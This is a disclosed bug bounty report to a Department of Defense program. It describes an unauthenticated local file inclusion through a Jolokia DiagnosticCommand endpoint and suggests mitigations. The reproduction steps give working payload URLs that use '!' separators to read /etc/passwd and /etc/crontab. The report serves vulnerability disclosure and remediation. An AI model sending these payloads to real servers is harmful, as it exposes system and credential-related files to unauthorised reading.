# Unauthenticated LFI (Local File Inclusion) using the symbol `!` At the target `https://████/`

## Report Details
- **Report ID**: 2778380
- **URL**: https://hackerone.com/reports/2778380
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-10-12T04:22:23.795Z
- **Disclosed**: 2024-10-25T16:03:24.555Z

## Reporter
- **Username**: todayisnew-
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi `DOD` Team,

# Summary:

* When accessing the endpoint on https://██████████/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/ it is possible to path traversal on the machine and reading local files by using `!` at every new directory injected allowing an attacker to read local files with even being Unauthenticated leads to a catastrophic impact on the main server.

# Steps to reproduce:

**1. Read the listed users on the instance ---> `/etc/passwd`:**

* https://███/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd

**2. Read Crontab jobs on the instance ---> `/etc/crontab`:**

* https://████/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/crontab


# PoC Video:

* ████


# Mitigation/Fix:

* Sanitize user input and don't trust user inputs that come for your server in a `GET` method after the endpoint `/compilerDirectivesAdd/{Attackers_Coming_From_Here_To_Read_Local_Files}`, it would be better to maintain a whitelist of acceptable filenames and use a unique corresponding identifier to access the file. Then any request containing an invalid identifier can just be rejected. Additionally, you could also sanitize any path traversal characters that may be present in any `GET` request.

## Impact

An attacker could read local files on the web server that they would normally not have access to, such as the application source code or configuration files containing sensitive information on how the website is configured, etc...

Best Regards,
Youssef


## Attachments
No attachments
